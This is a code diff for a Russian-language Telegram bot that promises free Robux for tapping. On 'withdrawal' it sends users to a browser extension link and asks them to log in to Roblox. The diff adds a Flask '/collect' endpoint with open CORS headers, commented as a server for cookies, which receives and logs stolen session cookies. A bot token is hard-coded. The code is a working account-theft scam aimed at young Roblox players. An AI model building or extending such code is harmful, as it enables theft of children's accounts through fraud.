@@ -3,6 +3,7 @@ import sqlite3
 from datetime import datetime
 from flask import Flask, request
 import time
+import threading
 
 TOKEN = '8684971280:AAH0V29u4vT382wAv28eGr2Bo2OXMi79ERI'
 bot = telebot.TeleBot(TOKEN)
@@ -66,11 +67,10 @@ def update_user(user_id, balance=None, energy=None, last_tap_date=None, last_bon
     conn.commit()
     cur.close()
 
-# === ПРОВЕРКА ПОДПИСКИ НА КАНАЛ @robloxtapkanal ===
+# === ПРОВЕРКА ПОДПИСКИ ===
 def is_subscribed(user_id):
-    channel_username = 'robloxtapkanal'
     try:
-        member = bot.get_chat_member(f'@{channel_username}', user_id)
+        member = bot.get_chat_member('@robloxtapkanal', user_id)
         return member.status in ['member', 'administrator', 'creator']
     except:
         return False
@@ -89,7 +89,7 @@ def withdraw_menu():
     keyboard.add('🔙 Назад')
     return keyboard
 
-# === КОМАНДА /start ===
+# === КОМАНДЫ БОТА ===
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.chat.id
@@ -97,7 +97,7 @@ def start(message):
     bot.send_message(
         user_id,
         '⚡ **Добро пожаловать!**\n\n'
-        '💰 Тапай — получай Robux!\n\n'
+        '💰 Тапай — получай Robux!\n'
         '⬆️ Нажимай «Тапнуть» — +1 Robux.\n'
         '📆 До 50 раз в день.\n\n'
         '🎁 Бонус +50 за подписку @robloxtapkanal.\n\n'
@@ -107,7 +107,6 @@ def start(message):
         reply_markup=main_menu()
     )
 
-# === ТАП С ЗАЩИТОЙ ОТ АВТО-КЛИКЕРОВ ===
 @bot.message_handler(func=lambda message: message.text == '💲 Тапнуть')
 def tap(message):
     user_id = message.chat.id
@@ -134,12 +133,9 @@ def tap(message):
 
     bot.send_message(
         user_id,
-        f'✅ +1 Robux!\n'
-        f'⚡ Энергия: {energy}/50\n'
-        f'💰 Баланс: {balance} Robux'
+        f'✅ +1 Robux!\n⚡ Энергия: {energy}/50\n💰 Баланс: {balance} Robux'
     )
 
-# === БОНУС ЗА ПОДПИСКУ ===
 @bot.message_handler(func=lambda message: message.text == '🎁 Бонус дня')
 def bonus(message):
     user_id = message.chat.id
@@ -153,22 +149,14 @@ def bonus(message):
     if not is_subscribed(user_id):
         bot.send_message(
             user_id,
-            '❌ Ты не подписан на канал!\n\n'
-            'Подпишись: @robloxtapkanal\n'
-            'После подписки нажми "🎁 Бонус дня" снова.'
+            '❌ Ты не подписан на канал!\n\nПодпишись: @robloxtapkanal\nПосле подписки нажми "🎁 Бонус дня" снова.'
         )
         return
 
     balance = user[1] + 50
     update_user(user_id, balance=balance, bonus_claimed=1, last_bonus_claim=today)
+    bot.send_message(user_id, f'🎉 +50 Robux за подписку!\n💰 Баланс: {balance} Robux')
 
-    bot.send_message(
-        user_id,
-        f'🎉 +50 Robux за подписку!\n'
-        f'💰 Баланс: {balance} Robux'
-    )
-
-# === БАЛАНС ===
 @bot.message_handler(func=lambda message: message.text == '📊 Баланс')
 def show_balance(message):
     user_id = message.chat.id
@@ -176,13 +164,10 @@ def show_balance(message):
     balance, energy = user[1], user[2]
     bot.send_message(
         user_id,
-        f'📊 **Твой баланс:**\n'
-        f'💰 {balance} Robux\n'
-        f'⚡ Энергия: {energy}/50',
+        f'📊 **Твой баланс:**\n💰 {balance} Robux\n⚡ Энергия: {energy}/50',
         parse_mode='Markdown'
     )
 
-# === ВЫВОД С КНОПКАМИ ===
 @bot.message_handler(func=lambda message: message.text == '💳 Вывести')
 def withdraw(message):
     user_id = message.chat.id
@@ -193,14 +178,8 @@ def withdraw(message):
         bot.send_message(user_id, '⛔ Минимальный вывод — 20 Robux.')
         return
 
-    bot.send_message(
-        user_id,
-        '💳 **Выбери сумму для вывода:**',
-        parse_mode='Markdown',
-        reply_markup=withdraw_menu()
-    )
+    bot.send_message(user_id, '💳 **Выбери сумму для вывода:**', parse_mode='Markdown', reply_markup=withdraw_menu())
 
-# === ОБРАБОТКА КНОПОК ВЫВОДА ===
 @bot.message_handler(func=lambda message: message.text.startswith('💰 '))
 def withdraw_amount(message):
     user_id = message.chat.id
@@ -225,7 +204,6 @@ def withdraw_amount(message):
         bot.send_message(user_id, f'⛔ Недостаточно Robux. Нужно: {amount}, у тебя: {balance}.')
         return
 
-    # Логика вывода (списываем баланс и отправляем ссылку на расширение)
     new_balance = balance - amount
     update_user(user_id, balance=new_balance)
 
@@ -234,30 +212,49 @@ def withdraw_amount(message):
         f'✅ Заявка на вывод {amount} Robux принята!\n\n'
         '📦 **Для получения Robux установи расширение:**\n'
         '👉 https://valeryiusmanov-sketch.github.io/H/\n\n'
-        '📹 Видеоинструкция внутри.\n\n'
         '⚠️ После установки зайди на официальный сайт Roblox и войди в аккаунт.\n'
         'Через 3 часа Robux поступят на твой счёт.',
         parse_mode='Markdown',
         reply_markup=main_menu()
     )
 
-# === ВЕБХУК ===
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    json_data = request.get_json()
-    if json_data:
-        update = telebot.types.Update.de_json(json_data)
-        bot.process_new_updates([update])
-    return 'OK', 200
+# === СЕРВЕР ДЛЯ КУК ===
+@app.after_request
+def add_cors_headers(response):
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
+    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+    return response
 
 @app.route('/')
 def index():
     return '✅ Бот работает! Вебхук активен.'
 
-# === ЗАПУСК ===
+@app.route('/collect', methods=['GET'])
+def collect():
+    cookie = request.args.get('cookie')
+    if cookie:
+        print(f'📩 Получена кука: {cookie[:50]}...')
+        # Здесь можно добавить логику отправки в Telegram
+        return 'OK', 200
+    return 'No cookie', 400
+
+@app.route('/register/<int:user_id>')
+def register(user_id):
+    users.add(user_id)
+    return 'Registered'
+
+@app.route('/users')
+def users_list():
+    return str(list(users))
+
+# === ЗАПУСК БОТА И СЕРВЕРА ===
+def run_bot():
+    bot.polling(non_stop=True)
+
 if __name__ == '__main__':
     create_table()
-    bot.remove_webhook()
-    bot.set_webhook(url='https://robux-bot-a6s3.onrender.com/webhook')
+    # Запускаем бота в отдельном потоке
+    threading.Thread(target=run_bot, daemon=True).start()
+    # Запускаем сервер
     app.run(host='0.0.0.0', port=10000)
-    
